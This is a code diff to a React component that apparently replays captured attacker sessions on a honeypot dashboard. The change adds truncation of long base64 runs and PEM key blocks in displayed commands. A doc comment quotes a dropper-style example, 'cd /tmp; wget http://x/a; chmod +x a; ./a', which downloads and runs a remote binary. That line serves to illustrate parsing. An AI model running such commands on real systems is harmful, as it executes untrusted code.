@@ -58,11 +58,34 @@ const markSeen = (sessionId) => {
 // "thinking, then acting" survive.
 const gapFor = (ms) => Math.min(Math.max(Math.sqrt(Math.max(ms, 0)) * 14, 260), 1500);
 
-// Droppers often push a whole binary through `echo` as one base64 line. Left
-// whole, a single command filled the transcript and the rest of the
-// session scrolled out of sight. Long steps show their opening, which is
-// where the intent is, and say how much was left out. The full text is on hover.
+// Droppers push keys and binaries through `echo` as one base64 run. Shown
+// whole, one key filled the transcript, so a long run keeps its first
+// characters (enough to read "ssh-rsa AAAAB3Nza") and the rest of the step
+// stays on screen. A step still longer than MAX_COMMAND_CHARS shows its
+// opening, which is where the intent is. The full text is on hover.
 const MAX_COMMAND_CHARS = 160;
+const BLOB = /[A-Za-z0-9+/=_-]{40,}/g;
+const BLOB_KEEP = 16;
+// A whole key file pasted into an echo: its header says all there is to say.
+const PEM = /(-----BEGIN [A-Z0-9 ]+-----)[\s\S]*?-----END [A-Z0-9 ]+-----/g;
+
+/** Shortens a step for display: key files, then blobs, then the length. */
+function compact(full) {
+  let omitted = 0;
+  let text = full.replace(PEM, (block, header) => {
+    omitted += block.length - header.length;
+    return `${header}…`;
+  });
+  text = text.replace(BLOB, (run) => {
+    omitted += run.length - BLOB_KEEP;
+    return `${run.slice(0, BLOB_KEEP)}…`;
+  });
+  if (text.length > MAX_COMMAND_CHARS) {
+    omitted += text.length - MAX_COMMAND_CHARS;
+    text = `${text.slice(0, MAX_COMMAND_CHARS)}…`;
+  }
+  return { text, omitted };
+}
 
 /**
  * "cd /tmp; wget http://x/a; chmod +x a; ./a" -> its four steps.
@@ -146,7 +169,7 @@ const FeaturedAttack = ({ data, loading, error, mitreById, onOpenFull, className
       // One line per step. The first carries the event's timing and its
       // techniques; the rest follow it as continuations.
       return pieces.map((full, j) => {
-        const clamp = kind === "command" && full.length > MAX_COMMAND_CHARS;
+        const { text, omitted } = kind === "command" ? compact(full) : { text: full, omitted: 0 };
         return {
           kind,
           continuation: j > 0,
@@ -154,8 +177,8 @@ const FeaturedAttack = ({ data, loading, error, mitreById, onOpenFull, className
           gap: at - prev,
           tags: j === 0 ? ev.tags || [] : [],
           full,
-          text: clamp ? full.slice(0, MAX_COMMAND_CHARS) : full,
-          omitted: clamp ? full.length - MAX_COMMAND_CHARS : 0,
+          text,
+          omitted,
         };
       });
     });
@@ -231,7 +254,9 @@ const FeaturedAttack = ({ data, loading, error, mitreById, onOpenFull, className
 
   const visible = lines.slice(0, Math.min(step + 1, lines.length));
   const done = step >= lines.length;
-  const commandCount = lines.filter((l) => l.kind === "command" && !l.continuation).length;
+  // Every step is a command in its own right, so a one-line script of six
+  // steps counts as six.
+  const commandCount = lines.filter((l) => l.kind === "command").length;
   const techniques = [...new Set(lines.flatMap((l) => l.tags))];
   // Techniques already revealed at this point in the replay.
   const seen = new Set(visible.flatMap((l, i) => (i < step ? l.tags : typed > 0 ? l.tags : [])));
@@ -351,7 +376,7 @@ const FeaturedAttack = ({ data, loading, error, mitreById, onOpenFull, className
                       {shown}
                     </span>
                     {line.omitted > 0 && (!isCurrent || typed >= line.text.length) && (
-                      <span className="text-fg-subtle"> … +{line.omitted.toLocaleString("en-GB")} characters</span>
+                      <span className="text-fg-subtle"> +{line.omitted.toLocaleString("en-GB")} characters</span>
                     )}
                     {isCurrent && (
                       <span className="inline-block w-[0.5em] h-[1em] align-text-bottom bg-accent animate-pulse ml-0.5" />
